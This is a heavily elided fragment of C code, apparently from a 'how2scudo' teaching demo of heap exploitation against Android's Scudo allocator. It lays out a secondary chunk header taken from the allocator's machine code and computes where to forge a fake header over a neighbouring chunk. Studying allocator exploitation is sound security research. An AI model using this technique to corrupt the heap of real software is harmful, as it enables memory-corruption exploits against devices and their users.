 ...
 * a017f07431ff6692304a0cae225962fb.
 *
 ...
 *   - the derived 0x40-byte secondary-header layout is in use; and
...
/*
 * Derived from the target's MapAllocator<AndroidConfig> machine code. The
 * first four pointer-sized fields are directly consumed during deallocation.
 * The remaining 0x20 bytes hold this build's MemMapDefault state and are
 * copied as opaque bytes because this technique deliberately leaves them zero.
 */
struct SecondaryChunkHeader {
    ...
    unsigned char mem_map[0x20];       /* +0x20 */
};
...
_Static_assert(offsetof(struct SecondaryChunkHeader, mem_map) == 0x20,
               "unexpected MemMapDefault offset");
...
int how2scudo_run(void) {
    ...
    /*
     * The fake secondary header begins high - 0x50. For 0x50-spaced primary
     * chunks that is exactly low, filling its 0x40-byte user allocation.
     */
    uintptr_t forged_header_address =
        untag((uintptr_t)high) - HOW2SCUDO_TARGET_SECONDARY_USER_DELTA;
    uintptr_t expected_header_address = untag((uintptr_t)low);
